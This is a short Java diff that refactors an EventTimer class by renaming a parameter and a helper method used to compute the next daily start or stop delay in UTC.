@@ -123,10 +123,10 @@ public class EventTimer extends BaseTimer {
 
 	/**
 	 * Calcola l'ora del prossimo evento
-	 * @param initialCheck
+	 * @param doSetDelay, false if doSetPeriod
 	 * @return
 	 */
-	private boolean setDailyDelay(boolean initialCheck) {
+	private boolean setDailyDelay(boolean doSetDelay) {
 		Calendar nowCalendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("UTC"));
 
 		long nextStart, nextStop;
@@ -135,8 +135,8 @@ public class EventTimer extends BaseTimer {
 		int now = ((nowCalendar.get(Calendar.HOUR_OF_DAY) * 3600) + (nowCalendar.get(Calendar.MINUTE) * 60) + nowCalendar
 				.get(Calendar.SECOND)) * 1000;
 
-		if (initialCheck) {
-			initialCheck();
+		if (doSetDelay) {
+			initialSetDelay();
 		}
 
 		// Estraiamo il prossimo evento e determiniamo il delay sulla base del
@@ -159,7 +159,7 @@ public class EventTimer extends BaseTimer {
 				Check.log(TAG + " (setDailyDelay): Delay (next start): " + (nextStart - now)); //$NON-NLS-1$
 			}
 
-			if (initialCheck)
+			if (doSetDelay)
 				setDelay(nextStart - now);
 			else
 				setPeriod(nextStart - now);
@@ -170,7 +170,7 @@ public class EventTimer extends BaseTimer {
 				Check.log(TAG + " (setDailyDelay): Delay (next stop): " + (nextStop - now)); //$NON-NLS-1$
 			}
 
-			if (initialCheck)
+			if (doSetDelay)
 				setDelay(nextStop - now);
 			else
 				setPeriod(nextStop - now);
@@ -181,7 +181,7 @@ public class EventTimer extends BaseTimer {
 		return ret;
 	}
 
-	private void initialCheck() {
+	private void initialSetDelay() {
 		Calendar nowCalendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));
 		int now = ((nowCalendar.get(Calendar.HOUR_OF_DAY) * 3600) + (nowCalendar.get(Calendar.MINUTE) * 60) + nowCalendar
 				.get(Calendar.SECOND)) * 1000;
